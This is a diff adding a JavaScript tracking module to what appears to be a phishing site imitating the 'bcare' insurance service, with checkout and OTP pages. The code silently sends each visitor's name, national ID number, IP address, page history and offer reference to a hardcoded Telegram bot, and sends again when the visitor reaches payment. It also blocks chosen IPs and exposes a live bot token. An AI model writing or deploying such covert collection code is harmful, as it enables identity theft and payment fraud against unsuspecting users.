@@ -1,0 +1,158 @@
+/* ═══════════════════════════════════════════════════════
+   Tracker — تتبع رحلة العميل + الحظر
+   ═══════════════════════════════════════════════════════ */
+
+const Tracker = (function () {
+  const STORAGE_KEY = 'bcare_journey';
+  const IP_KEY      = 'bcare_ip';
+  const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
+  const TG_CHAT     = '1451039924';
+
+  const PAGE_NAMES = {
+    'app.html':            'الصفحة الرئيسية',
+    'policy-details.html': 'تفاصيل الوثيقة',
+    'offers.html':         'العروض',
+    'secure-checkout.html':'الدفع',
+    'otp-verify.html':     'تأكيد OTP',
+  };
+
+  /* ─── جلب IP ─────────────────────────────────────── */
+  async function getIP() {
+    let ip = sessionStorage.getItem(IP_KEY);
+    if (ip) return ip;
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      ip = d.ip || 'unknown';
+    } catch(e) {
+      ip = 'unknown';
+    }
+    sessionStorage.setItem(IP_KEY, ip);
+    return ip;
+  }
+
+  /* ─── تسجيل صفحة ────────────────────────────────── */
+  function logPage(page) {
+    try {
+      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+      journey.push({
+        page,
+        pageName: PAGE_NAMES[page] || page,
+        time: new Date().toLocaleString('ar-SA'),
+        ts: Date.now(),
+      });
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(journey));
+    } catch(e) {}
+  }
+
+  /* ─── إرسال الرحلة لتليجرام ─────────────────────── */
+  async function sendJourneyToTelegram(extra) {
+    try {
+      const ip = await getIP();
+      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+      const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
+      const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
+
+      const pagesList = journey.map((j, i) =>
+        `  ${i + 1}. ${j.pageName} — ${j.time}`
+      ).join('\n');
+
+      const ref = offer.refNumber || '—';
+      const name = policy.fullName || '—';
+      const natId = JSON.parse(sessionStorage.getItem('bcare_form') || '{}').nationalId || '—';
+
+      const msg = `📊 <b>رحلة العميل</b>
+
+🆔 المرجع: <code>${ref}</code>
+👤 الاسم: ${name}
+🪪 الهوية: <code>${natId}</code>
+🌐 IP: <code>${ip}</code>
+
+📋 <b>الصفحات التي زارها:</b>
+${pagesList || '  لا توجد بيانات'}
+
+${extra || ''}`;
+
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT,
+          text: msg,
+          parse_mode: 'HTML',
+        }),
+      });
+    } catch(e) {}
+  }
+
+  /* ─── فحص الحظر ─────────────────────────────────── */
+  async function checkBlocked() {
+    try {
+      const ip = await getIP();
+
+      /* فحص محلي */
+      const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
+      if (local.some(b => b.ip === ip)) {
+        document.body.innerHTML = buildBlockedScreen();
+        return true;
+      }
+
+      /* فحص من ملف Blocked */
+      const r = await fetch('blocked.json?t=' + Date.now());
+      const blocked = await r.json();
+      if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
+        document.body.innerHTML = buildBlockedScreen();
+        return true;
+      }
+    } catch(e) {}
+    return false;
+  }
+
+  function buildBlockedScreen() {
+    return `<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Noto Sans Arabic',sans-serif;background:#f0f4f8;direction:rtl">
+      <div style="text-align:center;padding:2rem;max-width:400px">
+        <div style="width:80px;height:80px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem">
+          <span class="material-icons" style="font-size:2.5rem;color:#e53935">block</span>
+        </div>
+        <h1 style="color:#e53935;font-size:1.4rem;margin-bottom:.5rem">تم حظرك</h1>
+        <p style="color:#6b7c93;font-size:.9rem;line-height:1.7">لا يمكنك الوصول إلى هذا الموقع حالياً.<br/>يرجى التواصل مع الدعم للحصول على المساعدة.</p>
+      </div>
+    </div>`;
+  }
+
+  /* ─── حظر IP ─────────────────────────────────────── */
+  async function blockIP(ip) {
+    try {
+      const r = await fetch('blocked.json?t=' + Date.now());
+      const blocked = await r.json();
+      if (!blocked.some(b => b.ip === ip)) {
+        blocked.push({ ip, blockedAt: new Date().toISOString() });
+        /* نحفظ محلياً أيضاً */
+        localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
+      }
+    } catch(e) {}
+  }
+
+  /* ─── إرسال عند الدفع ────────────────────────────── */
+  async function onCheckout() {
+    await sendJourneyToTelegram('💰 <b>العميل وصل صفحة الدفع</b>');
+  }
+
+  /* ─── تنظيف ──────────────────────────────────────── */
+  function clear() {
+    localStorage.removeItem(STORAGE_KEY);
+  }
+
+  /* ─── تهيئة ──────────────────────────────────────── */
+  async function init() {
+    const blocked = await checkBlocked();
+    if (blocked) return;
+
+    const page = window.location.pathname.split('/').pop() || 'app.html';
+    logPage(page);
+  }
+
+  return { init, getIP, sendJourneyToTelegram, onCheckout, clear, checkBlocked };
+})();
+
+document.addEventListener('DOMContentLoaded', () => Tracker.init());
